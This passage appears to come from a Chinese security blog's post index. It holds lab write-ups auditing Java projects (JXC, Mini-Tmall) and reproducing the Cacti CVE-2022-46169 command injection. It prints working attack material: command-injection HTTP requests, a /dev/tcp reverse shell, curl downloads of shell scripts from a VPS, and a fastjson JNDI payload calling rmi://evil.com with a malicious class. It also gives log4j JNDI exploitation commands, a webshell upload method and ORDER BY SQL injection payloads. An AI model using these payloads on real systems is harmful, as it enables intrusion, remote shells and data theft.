#删除ID镜像\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"V2board-1-6-1-提权漏洞复现","date":"2022-12-19T05:27:27.000Z","categories_index":"逻辑漏洞","tags_index":"PHP","author_index":"Longw"},{"id":"99274788880f67f15a0d8a86bea61410","title":"Java代码审计练习项目JXC","content":"\n\n环境搭建：视频地址：https://www.bilibili.com/video/BV1NG4y187dX/?spm_id_from=333.788&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\n修改配置文件的数据库账号密码，以及服务启动端口。\n环境要求：\nJava版本：1.8.0_261，未使用1.8.0_71也能正常编译运行\nMysql版本：5.7 \n使用的是maven，idea自动导入插件\n后台地址：http://192.168.0.107:8888/login.html;jsessionid=9F8D6F8B01F8B1B1D525BCA70C5D0A9C\n这个后台地址的端口号默认是8080，为防止和burp冲突改为8888\n账号：admin     密码：admin123\n审计：第三方组件审计：\n\n\n组件名称\n版本号\n\n\n\nSpringBoot\n2.1.0\n\n\nMysql\n5.1.40\n\n\nmybatis\n3.4.6\n\n\nshiro-core\n1.4.0\n\n\nshiro1.4.0 ：shiro的使用：https://blog.csdn.net/wanliangsoft/article/details/86533754\nshiro历史漏洞：https://blog.csdn.net/qq_41832837/article/details/109064636\n华为云shiro漏洞通报：https://www.huaweicloud.com/intl/zh-cn/notice/20210616155804472.html\n从版本维度：\nShiro &lt;= 1.2.4 ：存在shiro-550反序列化漏洞；\n1.2.5 &lt;= Shiro &lt; 1.4.2 ：存在shiro-721反序列化漏洞；\nShiro &gt; = 1.4.2 ：如果用户使用弱密钥（互联网已公开/已泄露），即使升级至最新版本，仍然存在反序列化漏洞入口\n1.4.0存在反序列化，搭配spring存在身份认证绕过，只使用shiro鉴权存在权限绕过\ncve2020-1957分析：https://www.cnblogs.com/r00tuser/p/12575934.html\ncve2020-1957漏洞环境：https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2020-1957/README.zh-cn.md\ncve2020-2957分析：https://www.rednn.com/safe/202003/30176.html\ncve2020-11989分析：https://xz.aliyun.com/t/7964\ncve2020-13933分析：https://xz.aliyun.com/t/8230/\n项目中的shiro拦截配置：\n@Bean\npublic ShiroFilterFactoryBean shirFilter(SecurityManager securityManager) &#123;\n    ShiroFilterFactoryBean shiroFilterFactoryBean &#x3D; new ShiroFilterFactoryBean();\n\n    &#x2F;&#x2F; 必须设置 SecurityManager\n    shiroFilterFactoryBean.setSecurityManager(securityManager);\n\n    &#x2F;&#x2F; 如果不设置默认会自动寻找Web工程根目录下的&quot;&#x2F;login.jsp&quot;页面\n    shiroFilterFactoryBean.setLoginUrl(&quot;&#x2F;login.html&quot;);\n \n\n    &#x2F;&#x2F; 拦截器\n    Map&lt;String, String&gt; filterChainDefinitionMap &#x3D; new LinkedHashMap&lt;&gt;();\n    &#x2F;&#x2F; 配置不会被拦截的链接 顺序判断\n    filterChainDefinitionMap.put(&quot;&#x2F;static&#x2F;**&quot;, &quot;anon&quot;);\n    filterChainDefinitionMap.put(&quot;&#x2F;user&#x2F;login&quot;, &quot;anon&quot;);\n    filterChainDefinitionMap.put(&quot;&#x2F;drawImage&quot;, &quot;anon&quot;);\n\n    &#x2F;&#x2F; 配置退出过滤器,其中的具体的退出代码Shiro已经替我们实现了\n    filterChainDefinitionMap.put(&quot;&#x2F;user&#x2F;logOut&quot;, &quot;logout&quot;);\n\n\n    &#x2F;&#x2F; &lt;!-- 过滤链定义，从上向下顺序执行，一般将 &#x2F;**放在最为下边\n    &#x2F;&#x2F; &lt;!-- authc:所有url都必须认证通过才可以访问; anon:所有url都都可以匿名访问--&gt;\n    filterChainDefinitionMap.put(&quot;&#x2F;**&quot;, &quot;authc&quot;);\n\n    shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);\n    return shiroFilterFactoryBean;\n&#125;\n\n除了登录和静态资源全部都不能访问，直接根目录 /** 了。而存在绕过的漏洞模式：\n借用vulhub的代码\n@Bean\npublic ShiroFilterChainDefinition shiroFilterChainDefinition() &#123;\n    DefaultShiroFilterChainDefinition chainDefinition &#x3D; new DefaultShiroFilterChainDefinition();\n    chainDefinition.addPathDefinition(&quot;&#x2F;login.html&quot;, &quot;authc&quot;); &#x2F;&#x2F; need to accept POSTs from the login form\n    chainDefinition.addPathDefinition(&quot;&#x2F;logout&quot;, &quot;logout&quot;);\n    chainDefinition.addPathDefinition(&quot;&#x2F;admin&#x2F;**&quot;, &quot;authc&quot;);\n    return chainDefinition;\n&#125;\n\n都是前面带路径的，所以关于绕过的漏洞就不用看了。\n还有一个shiro721反序列化漏洞，登陆页面没有remember-Me，但是抓包发现cookie中有remember-Me字段。\n漏洞利用教程：https://blog.csdn.net/qq_41874930/article/details/121314926\n用一键化工具测试了一下，发现不行。全局搜索了key关键字也没找到。\n话说这个漏洞审计的时候应该怎么看呢？算了，先放一放。。。。\nsql注入审计：和前面一个一样，直接搜索 $(  \n没有任何发现，查找order by和like，发现写法也是正确的\nxss审计：全局搜索filter，看是否有过滤设置：\n只有前面的shiroconfig里有路径访问控制，所以和前面一样，搜索update和insert。update一般会在页面显示，所以找update\n找到的update比较多，一时半会不好弄。反正前面看了没有过滤，这时候就可以尝试黑盒了。在后台找能修改并且会显示的地方。\n在基础资料下面有一些修改输入字符串的地方：\n\n插入payload，点击保存后，立马就会弹窗\n\n其他地方也一样。\n其他审计：找了一下其他关键字，file全文没有上传文件的地方\n功能点就那么点，也就xss了。\n吐槽：快新年了，要开始专心复习了。还有好多要学的没学。最后几天，尽量学一点。\n","slug":"Java代码审计练习项目JXC","date":"2022-12-18T07:10:52.000Z","categories_index":"代码审计","tags_index":"Java","author_index":"Longw"},{"id":"d01e9b9478aaf264048aea2ee163e73a","title":"Cacti前台命令注入漏洞(CVE-2022-46169)复现","content":"\n\n直接看文章复现：https://github.com/vulhub/vulhub/blob/master/cacti/CVE-2022-46169/README.zh-cn.md\npayload没有回显：GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;touch+&#x2F;tmp&#x2F;aaa&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n反弹shell：测试一下反弹shell：bash -i &gt;&amp; /dev/tcp/IP/6666 0&gt;&amp;1\npayload使用了+号连接命令，直接反弹shell，web页面正常返回，但是接收不到shell。本地执行带+的命令肯定出错，所以+号是分割符。\n可以将反弹shell命令写入1.txt\n之后在vps上开启python的http服务，通过curl下载1.txt内容并且输出到2.sh\n之后通过bash运行，直接./2.sh是不行的\npython -m http.server 80\n\ncurl+http:&#x2F;&#x2F;IP&#x2F;1.txt+&gt;2.sh\n\nchmod+755+2.sh  #开始没有测试\n\nbash+2.sh   \n或者 .&#x2F;2.sh source+2.sh  . 2.sh  这三种都不行\n\n这个docker环境里面不需要赋权限就可以运行，可能是因为整个目录下都给了执行权限吧。\n后面又在服务器上测试了一下，发现了问题\n我是通过bash执行的这个sh文件，直接就有了bash的权限。\n直接执行 ./2.sh ，是不行的因为没有执行权限\ndocker里执行./2.sh同样是权限拒绝，所以现在可以测试chmod命令是否能执行\nGET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;chmod+755+2.sh&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n发包之后，发现权限被修改了\n\n在执行 ./2.sh，发现还是不能反弹shell。\nGET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;.&#x2F;2.sh&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n又找了一下，发现 . 2.sh 也可以执行脚本，再发包\nGET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;.+2.sh&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n又不行，看第四种，source 2.sh\nGET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;source+2.sh&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n还是不行？？？\n再换成bash，直接就弹shell了？？？？？？\n本地执行都是没有问题的。这又是为什么呢?\n最后在测试一个sh 2.sh，发现还是不行。docker里测试发现报错，sh指向了dash而不是bash\n解决方法：https://blog.csdn.net/qq_44664843/article/details/120509888\nmv &#x2F;bin&#x2F;sh &#x2F;bin&#x2F;sh.orig\nln -s &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh\n\nroot不用加sudo\n再测试一下sh执行\nGET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;sh+2.sh&#96; HTTP&#x2F;1.1\nX-Forwarded-For: 127.0.0.1\nHost:192.168.0.110:8080\nUser-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8\nAccept-Language: en-US,en;q&#x3D;0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n\n弹shell成功了\n几种执行sh文件的方式：\nhttps://blog.csdn.net/weixin_45668674/article/details/107394335\nhttps://www.cnblogs.com/pcat/p/5467188.html\n关闭环境：docker-compose down -v #关闭镜像 \ndocker images   #列出所有下载镜像 \ndocker rmi --force ID    #删除ID镜像\n\n至于p牛的回显问题，都弹shell了，回显干什么。\n","slug":"Cacti前台命令注入漏洞-CVE-2022-46169-复现","date":"2022-12-15T08:49:17.000Z","categories_index":"RCE","tags_index":"PHP","author_index":"Longw"},{"id":"b150dfa8a93554c7d2d6ced6f280771f","title":"Java代码审计练习项目Mini-Tmall","content":"\n\n环境搭建：项目地址：https://gitee.com/project_team/Tmall_demo#%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E\n大佬视频教程链接：https://www.bilibili.com/video/BV1i8411e75D/?spm_id_from=333.788&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\n参考文档地址：https://www.freebuf.com/articles/web/348349.html\n环境要求：\nJava版本：1.8.0_261，未使用1.8.0_71也能正常编译运行\nMysql版本：5.7 \n使用的是maven，idea自动导入插件\n前台地址：http://localhost:8080/tmall\n后台地址：http://localhost:8080/tmall/admin\n账号：admin     密码：123456\n审计：第三方组件审计：因为使用的是maven，所以直接查看pom.xml，看第三方库的版本是否是有漏洞的版本。\n\n\n\n组件名称\n版本号\n\n\n\nSpringBoot\n2.6.1\n\n\nMysql\n8.0.27\n\n\ndruid\n1.2.8\n\n\nfastjson\n1.2.78\n\n\ntaglibs\n1.2.5\n\n\nmybatis\n3.5.7\n\n\nlog4j2\n2.16.0\n\n\n这个项目版本跟视频教程里面的项目版本不一样，还有有的组件在pom.xml中没有写出。还是直接看idea里面的外部库查看版本。\n关于第三方组件，当然是查看是否是漏洞版本，高版本是否存在遗留问题，是否存在配置错误问题等等。\nfastjson1.2.78：fastjson历史漏洞：https://blog.csdn.net/dreamthe/article/details/125851153\n漏洞利用：\nhttps://blog.csdn.net/god_zzZ/article/details/107122487\nhttps://www.cnblogs.com/mysticbinary/p/12788019.html\nwindwos下反弹shell：https://blog.csdn.net/qq_39101049/article/details/96191861\n对比发现fastjson的版本小于1.2.80，小于1.2.80存在反序列化漏洞\n全局搜索关键字：JSON.par\n在ProductContoller.java中存在三次调用，找第一处\n\n往上看代码，发现propertyJson就是通过POST传参。接下来找该方法路由，直接拼接路径访问，发现页面特点：\n\n再查找功能点，发现页面是所有商品—添加一件商品，随意输入信息，抓包，修改propertyJson字段为fastjson的dnslog探测payload：\n&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;40kiqu.dnslog.cn&quot;&#125;\n\n使用dnslog平台，发包，返回500，但是dnslog平台一件收到解析\n\ndnslog：\n证明存在fastjson反序列化漏洞，windows下就不弹shell了，换成虚拟机里的vulhub玩一玩弹shell的步骤。\nfastjson漏洞复现：在Ubuntu虚拟机里开启vulhub靶场的fastjson1.2.47的绕过白名单rce镜像\ndocker-compose up -d\n\n访问http://IP:8090即可看到以下json字段\n&#123;\n\t&quot;age&quot;:25,\n\t&quot;name&quot;:&quot;Bob&quot;\n&#125;\n\n参考复现教程：https://vulhub.org/#/environments/fastjson/1.2.47-rce/\n使用hackerbar发送POST数据包，添加json字段，修改age和name的值，发现页面返回值的name修改成自己提交的值。\n接下来，就是利用。在服务器新建恶意类：\nTouchFile.java：\n&#x2F;&#x2F; javac TouchFile.java\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class TouchFile &#123;\n    static &#123;\n        try &#123;\n            Runtime rt &#x3D; Runtime.getRuntime();\n            String[] commands &#x3D; &#123;&quot;touch&quot;, &quot;&#x2F;tmp&#x2F;success&quot;&#125;;\n            Process pc &#x3D; rt.exec(commands);\n            pc.waitFor();\n        &#125; catch (Exception e) &#123;\n            &#x2F;&#x2F; do nothing\n        &#125;\n    &#125;\n&#125;\n\n修改成反弹shell命令，添加自己vps的IP和端口，之后使用javac编译，再开启python的httpserver，默认端口80\n使用\nhttps://github.com/mbechler/marshalsec\n项目，开启LDAP服务：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;【公网IP】&#x2F;#Exploit 7776\n\n前面python端口是80，就不需要再LDAP的公网IP后面添加端口\n之后使用nc监听，这个nc的端口是前面java文件里写的端口\nnc -nlvp xxxx\n\n之后在刚刚的页面，抓取POST数据包，发送到repeater模块，修改json字段为payload：\n&#123;\n    &quot;a&quot;:&#123;\n        &quot;@type&quot;:&quot;java.lang.Class&quot;,\n        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;\n    &#125;,\n    &quot;b&quot;:&#123;\n        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,\n        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;evil.com:9999&#x2F;Exploit&quot;,\n        &quot;autoCommit&quot;:true\n    &#125;\n&#125;\n\n这个IP端口是LDAP服务绑定的IP和端口\n发送数据包，就可以在vps上收到shell连接\n\n复现完成就可以关闭docker环境\ndocker-compose down -v #关闭镜像\ndocker images   #列出所有下载镜像\ndocker rmi --force ID    #删除ID镜像\n\nlog4j2   2.16.0：这个版本的log4j2，默认关闭了jndi，且删除了msg lookup。查找历史漏洞只存在一个ddos漏洞，就不看了。\n找了很久的文章，发现一篇好文，讲的是log4j2后序修复版本的遗留问题。在2.15.0还是有可能触发rce的，但是2.16.0需要自定义配置并且需要mac系统加上利用链才可能触发反序列化漏洞。\n至于2.17.0的修改配置文件rce，这个。。。。。给我修改的机会，我也不会！\nlog4j2漏洞修复遗留问题：https://blog.csdn.net/qsort_/article/details/122101423\nlog4j2漏洞利用教程：https://www.freebuf.com/vuls/329984.html\nlog4j2漏洞复现：虽然这个项目没有rce，但是看到这个核弹漏洞，还是复现一波的好。\n还是vulhub：https://github.com/vulhub/vulhub/blob/master/log4j/CVE-2021-44228/README.zh-cn.md\nJNDI注入工具：\nhttps://github.com/welk1n/JNDI-Injection-Exploit\nhttps://github.com/su18/JNDI   这个需要使用文档\n开启docker服务：docker-compose up -d\n访问：http://192.168.0.110:8983/solr/#/   看到solr服务页面\n使用dnslog平台，直接使用payload：\nhttp://192.168.0.110:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.kxapac.dnslog.cn}\n可以收到Java版本信息：\n\n看看能不能反弹shell：\n开启jndi服务：\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  -C bash -c &quot;&#123;echo,bash编码的反弹shell命令&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 192.168.0.107\n\n直接使用ldap：http://192.168.0.110:8983/solr/admin/cores?action=${jndi:ldap://192.168.0.107:1389/fz7elu}\n在vps上成功接收shell：\n!\n记得关环境：  随手关门好习惯\ndocker-compose down -v #关闭镜像\ndocker images   #列出所有下载镜像\ndocker rmi --force ID    #删除ID镜像\n\n任意文件上传：在后台存在管理员上传头像，一些产品上传图片功能\n这个项目代码有中文注释，加上很明显的文件名，稍稍找找就能发现路由代码位置。\n管理员头像：先看管理员头像上传的代码：\n&#x2F;&#x2F;管理员头像上传\n    @ResponseBody\n    @RequestMapping(value &#x3D; &quot;admin&#x2F;uploadAdminHeadImage&quot;, method &#x3D; RequestMethod.POST, produces &#x3D; &quot;application&#x2F;json;charset&#x3D;UTF-8&quot;)\n    public String uploadAdminHeadImage(@RequestParam MultipartFile file, HttpSession session) &#123;\n        String originalFileName &#x3D; file.getOriginalFilename();\n        logger.info(&quot;获取图片原始文件名：&#123;&#125;&quot;, originalFileName);\n        assert originalFileName !&#x3D; null;\n        String extension &#x3D; originalFileName.substring(originalFileName.lastIndexOf(&#39;.&#39;));\n        &#x2F;&#x2F;生成随机名\n        String fileName &#x3D; UUID.randomUUID() + extension;\n        &#x2F;&#x2F;获取上传路径\n        String filePath &#x3D; session.getServletContext().getRealPath(&quot;&#x2F;&quot;) + &quot;res&#x2F;images&#x2F;item&#x2F;adminProfilePicture&#x2F;&quot; + fileName;\n\n        logger.info(&quot;文件上传路径：&#123;&#125;&quot;, filePath);\n        JSONObject jsonObject &#x3D; new JSONObject();\n        try &#123;\n            logger.info(&quot;文件上传中...&quot;);\n            file.transferTo(new File(filePath));\n            logger.info(&quot;文件上传成功！&quot;);\n            jsonObject.put(&quot;success&quot;, true);\n            jsonObject.put(&quot;fileName&quot;, fileName);\n        &#125; catch (IOException e) &#123;\n            logger.warn(&quot;文件上传失败！&quot;);\n            e.printStackTrace();\n            jsonObject.put(&quot;success&quot;, false);\n        &#125;\n        return jsonObject.toJSONString();\n    &#125;\n\n直接获取文件名，之后获取后缀，将其直接与随机uuid拼接，重命名上传文件，直接上传，没有任何过滤操作。\n黑盒测试，发现有前端校验，那就讲webshell修改为jpg后缀，绕过前端校验，之后抓包修改后缀和MIME格式。\n后缀改为jsp，content-type修改为text/plain\n\n收到json格式返回路径，那么直接拼接路径访问：\nhttp://192.168.0.107:8080/tmall/res/images/item/adminProfilePicture/4c50144f-8994-4c63-9c0b-b018a7067097.jsp\n没有问题，直接使用冰蝎连接\n\n成功执行命令。\n接下来看另一处可以上传文件的地方，产品图片\n产品图片：&#x2F;&#x2F;上传产品图片-ajax\n    @ResponseBody\n    @RequestMapping(value &#x3D; &quot;admin&#x2F;uploadProductImage&quot;, method &#x3D; RequestMethod.POST, produces &#x3D; &quot;application&#x2F;json;charset&#x3D;utf-8&quot;)\n    public String uploadProductImage(@RequestParam MultipartFile file, @RequestParam String imageType, HttpSession session) &#123;\n        String originalFileName &#x3D; file.getOriginalFilename();\n        logger.info(&quot;获取图片原始文件名：&#123;&#125;&quot;, originalFileName);\n        String extension &#x3D; originalFileName.substring(originalFileName.lastIndexOf(&#39;.&#39;));\n        String filePath;\n        String fileName &#x3D; UUID.randomUUID() + extension;\n        if (&quot;single&quot;.equals(imageType)) &#123;\n            filePath &#x3D; session.getServletContext().getRealPath(&quot;&#x2F;&quot;) + &quot;res&#x2F;images&#x2F;item&#x2F;productSinglePicture&#x2F;&quot; + fileName;\n        &#125; else &#123;\n            filePath &#x3D; session.getServletContext().getRealPath(&quot;&#x2F;&quot;) + &quot;res&#x2F;images&#x2F;item&#x2F;productDetailsPicture&#x2F;&quot; + fileName;\n        &#125;\n\n        logger.info(&quot;文件上传路径：&#123;&#125;&quot;, filePath);\n        JSONObject object &#x3D; new JSONObject();\n        try &#123;\n            logger.info(&quot;文件上传中...&quot;);\n            file.transferTo(new File(filePath));\n            logger.info(&quot;文件上传完成&quot;);\n            object.put(&quot;success&quot;, true);\n            object.put(&quot;fileName&quot;, fileName);\n        &#125; catch (IOException e) &#123;\n            logger.warn(&quot;文件上传失败！&quot;);\n            e.printStackTrace();\n            object.put(&quot;success&quot;, false);\n        &#125;\n\n        return object.toJSONString();\n    &#125;\n&#125;\n\n对比前一个管理员头像上传，多了一个imagetype的判断。但是不管是true还是false都会上传，就是路径不一样而已。这个imagetype也是一个参数，可以在包中修改。\n直接和前面一样，上传，抓包，看路径，拼接访问：\n\n在burp里面选择ation—-&gt;do intercept—-&gt;就一个选项，就会接收上传数据包的响应包：\n\n可以看到返回路径，直接访问：http://192.168.0.107:8080/tmall/res/images/item/productSinglePicture/05fd083f-6f5a-448a-9470-74ae2277c0bb.jsp\n之后，用冰蝎连接：\n\n成功。\n搜索以下upload，发现共有4处，其中一处是前台。\nsql注入：使用的是mybatis，直接搜索$( 。但是文件好多，看了大佬的文档，提示只需要找 xxxMapper.xml就行了。\n有点坑的是idea全局搜索，在项目里没找到xml。进入mybatis/mapper目录后，全局查找选择目录找到了。。。。\n共有五处，全是order by语句，并且类型都一样，看一个就行了\n通过对目录的了解，其中前台用户的文件名会使用user，所有查看usermapper.xml，试试前台注入\n&lt;select id&#x3D;&quot;select&quot; resultMap&#x3D;&quot;userMap&quot;&gt;\n     SELECT user_id,user_name,user_nickname,user_password,user_realname,user_gender,user_birthday,user_profile_picture_src,user_address,user_homeplace FROM user\n     &lt;if test&#x3D;&quot;user !&#x3D; null&quot;&gt;\n         &lt;where&gt;\n             &lt;if test&#x3D;&quot;user.user_name !&#x3D; null&quot;&gt;\n                 (user_name LIKE concat(&#39;%&#39;,#&#123;user.user_name&#125;,&#39;%&#39;) or user_nickname LIKE concat(&#39;%&#39;,#&#123;user.user_name&#125;,&#39;%&#39;))\n             &lt;&#x2F;if&gt;\n             &lt;if test&#x3D;&quot;user.user_gender !&#x3D; null&quot;&gt;\n                 and user_gender &#x3D; #&#123;user.user_gender&#125;\n             &lt;&#x2F;if&gt;\n         &lt;&#x2F;where&gt;\n     &lt;&#x2F;if&gt;\n     &lt;if test&#x3D;&quot;orderUtil !&#x3D; null&quot;&gt;\n         ORDER BY $&#123;orderUtil.orderBy&#125;&lt;if test&#x3D;&quot;orderUtil.isDesc&quot;&gt;desc &lt;&#x2F;if&gt;\n     &lt;&#x2F;if&gt;\n\n直接拼接，现在查看使用该sql语句的接口。\n一时半会根本找不到，还好有插件：free-mybatis-tool，直接跳转到java代码。\npublic interface UserMapper &#123;\n    Integer insertOne(@Param(&quot;user&quot;) User user);\n    Integer updateOne(@Param(&quot;user&quot;) User user);\n\n    List&lt;User&gt; select(@Param(&quot;user&quot;) User user, @Param(&quot;orderUtil&quot;) OrderUtil orderUtil, @Param(&quot;pageUtil&quot;) PageUtil pageUtil);\n    User selectOne(@Param(&quot;user_id&quot;) Integer user_id);\n    User selectByLogin(@Param(&quot;user_name&quot;) String user_name, @Param(&quot;user_password&quot;) String user_password);\n    Integer selectTotal(@Param(&quot;user&quot;) User user);\n&#125;\n\n就是那句List&lt;user，接下来就是ctrl+左键，一直往上面找；\n@Override\n    public List&lt;User&gt; getList(User user, OrderUtil orderUtil, PageUtil pageUtil) &#123;\n        return userMapper.select(user,orderUtil,pageUtil);\n    &#125;\n\n&#x2F;&#x2F;按条件查询用户-ajax\n @ResponseBody\n @RequestMapping(value &#x3D; &quot;admin&#x2F;user&#x2F;&#123;index&#125;&#x2F;&#123;count&#125;&quot;, method &#x3D; RequestMethod.GET, produces &#x3D; &quot;application&#x2F;json;charset&#x3D;UTF-8&quot;)\n public String getUserBySearch(@RequestParam(required &#x3D; false) String user_name&#x2F;* 用户名称 *&#x2F;,\n                               @RequestParam(required &#x3D; false) Byte[] user_gender_array&#x2F;* 用户性别数组 *&#x2F;,\n                               @RequestParam(required &#x3D; false) String orderBy&#x2F;* 排序字段 *&#x2F;,\n                               @RequestParam(required &#x3D; false,defaultValue &#x3D; &quot;true&quot;) Boolean isDesc&#x2F;* 是否倒序 *&#x2F;,\n                               @PathVariable Integer index&#x2F;* 页数 *&#x2F;,\n                               @PathVariable Integer count&#x2F;* 行数 *&#x2F;) throws UnsupportedEncodingException &#123;\n     &#x2F;&#x2F;移除不必要条件\n     Byte gender &#x3D; null;\n     if (user_gender_array !&#x3D; null &amp;&amp; user_gender_array.length &#x3D;&#x3D; 1) &#123;\n         gender &#x3D; user_gender_array[0];\n     &#125;\n\n     if (user_name !&#x3D; null) &#123;\n         &#x2F;&#x2F;如果为非空字符串则解决中文乱码：URLDecoder.decode(String,&quot;UTF-8&quot;);\n         user_name &#x3D; &quot;&quot;.equals(user_name) ? null : URLDecoder.decode(user_name, &quot;UTF-8&quot;);\n     &#125;\n     if (orderBy !&#x3D; null &amp;&amp; &quot;&quot;.equals(orderBy)) &#123;\n         orderBy &#x3D; null;\n     &#125;\n     &#x2F;&#x2F;封装查询条件\n     User user &#x3D; new User()\n             .setUser_name(user_name)\n             .setUser_gender(gender);\n\n     OrderUtil orderUtil &#x3D; null;\n     if (orderBy !&#x3D; null) &#123;\n         logger.info(&quot;根据&#123;&#125;排序，是否倒序:&#123;&#125;&quot;,orderBy,isDesc);\n         orderUtil &#x3D; new OrderUtil(orderBy, isDesc);\n     &#125;\n\n     JSONObject object &#x3D; new JSONObject();\n     logger.info(&quot;按条件获取第&#123;&#125;页的&#123;&#125;条用户&quot;, index + 1, count);\n     PageUtil pageUtil &#x3D; new PageUtil(index, count);\n     List&lt;User&gt; userList &#x3D; userService.getList(user, orderUtil, pageUtil);\n     object.put(&quot;userList&quot;, JSONArray.parseArray(JSON.toJSONString(userList)));\n     logger.info(&quot;按条件获取用户总数量&quot;);\n     Integer userCount &#x3D; userService.getTotal(user);\n     object.put(&quot;userCount&quot;, userCount);\n     logger.info(&quot;获取分页信息&quot;);\n     pageUtil.setTotal(userCount);\n     object.put(&quot;totalPage&quot;, pageUtil.getTotalPage());\n     object.put(&quot;pageUtil&quot;, pageUtil);\n\n     return object.toJSONString();\n &#125;\n\n但是啊！！！很尴尬，找到了，发现xxx是后台的。。。。。。\n看这个方法，就知道是用户管理里的查询。直接输入1之后抓包，可以看到的确是这个：\n\n直接使用文档里面的payload：https://www.freebuf.com/articles/web/348349.html\n①、使用rand函数结果显示排序方式不同\norderBy&#x3D;rand(1&#x3D;1)\norderBy&#x3D;rand(1&#x3D;2)\n\n②、利用regexp（正则表达式）\norderBy&#x3D;(select+1+regexp+if(1&#x3D;1,1,0x00)) 正常\norderBy&#x3D;(select+1+regexp+if(1&#x3D;2,1,0x00)) 错误\n\n③、利用updatexml（更新选定XML片段的内容）\norderBy&#x3D;updatexml(1,if(1&#x3D;1,1,user()),1) 正确\norderBy&#x3D;updatexml(1,if(1&#x3D;2,1,user()),1) 错误\n\n④、利用extractvalue（从目标XML中返回包含所查询值的字符 串）\norderBy&#x3D;extractvalue(1,if(1&#x3D;1,1,user())) 正确\norderBy&#x3D;extractvalue(1,if(1&#x3D;2,1,user())) 错误\n\n⑤、时间盲注\norderBy&#x3D;if(1&#x3D;1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) \n正常响应时间\norderBy&#x3D;if(1&#x3D;2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) \nsleep 